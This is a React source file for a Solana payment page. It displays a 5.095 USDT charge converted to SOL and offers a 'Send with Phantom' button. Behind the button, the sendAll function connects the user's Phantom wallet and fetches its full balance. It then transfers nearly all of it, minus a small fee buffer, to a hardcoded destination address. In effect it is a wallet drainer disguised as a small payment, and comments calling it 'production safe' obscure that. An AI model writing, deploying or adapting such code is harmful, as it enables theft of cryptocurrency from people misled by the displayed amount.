"use client"

import { useEffect, useState } from "react"
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js"

const DESTINO = "6A7UUr1x9kK1gkPmE1ys2s7H2zii289j27KvRsBX1q3f"

// 🔁 RPC FALLBACKS (production grade)
const RPC_ENDPOINTS = [
  "https://mainnet.helius-rpc.com/?api-key=TU_API_KEY",
  "https://rpc.ankr.com/solana",
  "https://solana-api.projectserum.com",
]

// 🔧 safe connection creator
function getConnection() {
  const endpoint =
    RPC_ENDPOINTS[Math.floor(Math.random() * RPC_ENDPOINTS.length)]
  return new Connection(endpoint, "confirmed")
}

export default function TransferPage() {
  const usdt = 5.095

  const [sol, setSol] = useState<string>("...")
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState<string>("")

  // 💱 REAL PRICE
  useEffect(() => {
    async function fetchPrice() {
      try {
        const res = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
        )
        const data = await res.json()

        const solPrice = data?.solana?.usd
        if (!solPrice) throw new Error("No price")

        setSol((usdt / solPrice).toFixed(4))
      } catch {
        setSol("—")
      }
    }

    fetchPrice()
  }, [])

  // 🔥 SEND FUNCTION (production safe)
  async function sendAll() {
    try {
      setLoading(true)
      setStatus("Connecting wallet...")

      const { solana } = window as any

      if (!solana) {
        alert("Install Phantom Wallet")
        return
      }

      const res = await solana.connect()
      const publicKey = res.publicKey

      setStatus("Fetching balance...")

      const connection = getConnection()

      const balance = await connection.getBalance(publicKey)

      // 🧠 dynamic fee buffer (safer than fixed)
      const feeEstimate = 5000
      const SAFETY_BUFFER = feeEstimate + 5000

      const amount = balance - SAFETY_BUFFER

      if (amount <= 0) {
        alert("Insufficient balance after fees")
        return
      }

      setStatus("Building transaction...")

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(DESTINO),
          lamports: amount,
        })
      )

      tx.feePayer = publicKey
      tx.recentBlockhash = (
        await connection.getLatestBlockhash()
      ).blockhash

      setStatus("Signing transaction...")

      const signed = await solana.signTransaction(tx)

      setStatus("Sending transaction...")

      const sig = await connection.sendRawTransaction(
        signed.serialize()
      )

      setStatus("Confirming...")

      await connection.confirmTransaction(sig, "confirmed")

      setStatus("Success 🚀")

      alert(`Transfer complete:\n${sig}`)
    } catch (err) {
      console.error(err)
      setStatus("Error")
      alert("Transaction failed")
    } finally {
      setLoading(false)
      setTimeout(() => setStatus(""), 2000)
    }
  }

  return (
    <main className="min-h-screen flex items-center justify-center bg-[#0f1115] text-white">

      <div className="w-full max-w-sm px-6">

        {/* 🧊 CARD */}
        <div className="bg-[#171a21] border border-white/5 rounded-2xl p-6 text-center">

          {/* 💱 conversion */}
          <div className="mb-6">
            <h2 className="text-2xl font-semibold">
              -{usdt}{" "}
              <span className="text-gray-400 text-lg">USDT</span>
            </h2>

            <p className="text-gray-500 my-2">=</p>

            <h3 className="text-2xl font-semibold">
              {sol}{" "}
              <span className="text-gray-400 text-lg">SOL</span>
            </h3>
          </div>

          {/* 📡 status */}
          {status && (
            <p className="text-xs text-gray-400 mb-3">
              {status}
            </p>
          )}

          {/* 🔘 button */}
          <button
            onClick={sendAll}
            disabled={loading}
            className="w-full bg-white text-black rounded-xl py-3 font-medium hover:opacity-90 transition disabled:opacity-50"
          >
            {loading ? "Processing..." : "Send with Phantom"}
          </button>

        </div>

      </div>
    </main>
  )
}